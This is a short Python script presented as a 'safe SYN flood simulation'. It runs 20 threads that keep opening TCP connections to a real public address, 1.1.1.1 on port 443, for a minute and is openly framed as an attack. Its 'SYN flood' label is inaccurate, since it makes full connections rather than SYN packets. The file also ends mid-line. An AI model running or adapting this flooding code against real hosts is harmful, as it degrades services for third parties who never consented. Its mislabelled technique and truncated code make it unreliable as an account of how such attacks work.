import socket
import random
import threading
import time
# Target server details
target_ip = '1.1.1.1'  # IP address of the target server
target_port = 443  # Port number of the target server
# Flag to control the attack
attack_active = True
# Function to simulate SYN flood
def safe_syn_flood(thread_id):
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Set a timeout for socket operations to avoid hanging
            s.connect((target_ip, target_port))
            s.send(b'Hello from safe SYN flood simulation')  # Simulated benign packet
            print(f"Thread {thread_id}: Safe packet sent to target server!")
            s.close()
        except socket.timeout:
            print(f"Thread {thread_id}: Connection timed out.")
        except Exception as e:
            print(f"Thread {thread_id}: An error occurred: {e}")
        time.sleep(random.uniform(0.1, 1))  # Random sleep to simulate varied traffic
# Function to initiate multiple threads for the attack
def start_safe_flood(num_threads):
    print(f"Starting safe SYN flood simulation with {num_threads} threads...")
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=safe_syn_flood, args=(i+1,))
        thread.start()
        threads.append(thread)
    return threads
# Function to stop the flood
def stop_safe_flood(threads):
    global attack_active
    attack_active = False
    for thread in threads:
        thread.join()
    print("Flood stopped. All threads are closed.")
# Main function
if __name__ == "__main__":
    num_threads = 20
    threads = start_safe_flood(num_threads)
    try:
        time.sleep(60)  # Run the attack for 60 seconds
    finally:
        stop_safe_flood(thread
